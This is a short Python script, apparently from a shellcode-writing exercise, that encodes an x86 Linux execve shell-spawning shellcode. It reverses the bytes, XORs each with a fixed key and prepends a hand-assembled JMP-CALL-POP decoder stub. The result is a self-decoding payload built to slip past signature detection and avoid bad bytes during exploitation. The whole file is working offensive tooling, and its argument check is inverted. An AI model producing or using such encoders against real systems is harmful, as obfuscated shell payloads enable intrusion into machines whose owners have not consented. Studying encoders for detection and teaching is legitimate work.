#!/usr/bin/python
# encoder.py
#  - Encode shellcode using 'Flip-XOR', then prepend decoder

import sys

if (len(sys.argv) != 1):
	print "[-] No inputs! Configure shellcode manually."
	sys.exit()

shellcode = (		# execve(/bin//sh)
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62"
"\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3"
"\x50\x89\xe2\x53\x89\xe1\x31\xc0\xb0\x0b"
"\xcd\x80"
)

key = 0xab

length = len(shellcode)
print "Original Length: %d" % length

output = ""

# _start:
output += "\\xeb\\x1e"			# jmp short call_decoder

# decoder:
output += "\\x5e"			# pop esi
output += "\\x31\\xc9"			# xor ecx, ecx
output += "\\xb1\\x%02x" % length	# mov cl, <length>
output += "\\x89\\xf7"			# mov edi, esi
output += "\\x01\\xcf"			# add edi, ecx
output += "\\x01\\xcf"			# add edi, ecx
output += "\\x4f"			# dec edi

# decode:
output += "\\x31\\xdb"			# xor ebx, ebx
output += "\\x8a\\x1e"			# mov bl, byte [esi]
output += "\\x80\\xf3\\x%02x" % key	# xor bl, <key>
output += "\\x88\\x1f"			# mov byte [edi], bl
output += "\\xc6\\x06\\x90"		# mov byte [esi], 0x90
output += "\\x46"			# inc esi
output += "\\x4f"			# dec edi
output += "\\xe2\\xf0"			# loop decode
output += "\\xeb\\x05"			# jmp short Shellcode

# call_decoder:
output += "\\xe8\\xdd\\xff\\xff\\xff" 	# call decoder

# Shellcode:
arr = bytearray(shellcode)
for i in range(0, length):
	# 'Flip-XOR' Encoding
	x = arr[length-1-i]
	y = x^key
	output += "\\x%02x" % y

newlength = len(output) / 4
print "Encoded Length: %d" % newlength
print "\"%s\"" % output
